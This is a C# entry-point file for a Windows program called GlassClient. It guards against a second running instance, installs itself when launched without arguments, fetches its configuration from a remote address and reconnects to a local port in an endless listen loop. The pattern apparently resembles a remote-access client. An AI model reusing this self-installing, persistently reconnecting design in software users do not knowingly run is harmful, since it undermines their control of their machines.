using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace GlassClient
{
    static class Program
    {
        public static VirtualFileSystem VirtualFileSystem = null;
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (Process.GetProcessesByName(System.IO.Path.GetFileNameWithoutExtension(System.Reflection.Assembly.GetEntryAssembly().Location)).Count() > 1)
                return;
            if (args.Length <= 0)
                new GlassInstaller().Install();
            while (true)
            {
                string[] config = new WebClient().DownloadString(Constants.CONFIG_ADDRESS).Split(' ');
                using (GlassConnection connection = new GlassConnection())
                {
                    while (!connection.Connect("127.0.0.1", Convert.ToInt32(config[1]))) Thread.Sleep(5000);
                    while (true)
                    {
                        if (!connection.Listen())
                            if (!(connection.SendError("Failed!")))
                                break;
                    }
                }
            }
        }
    }
}
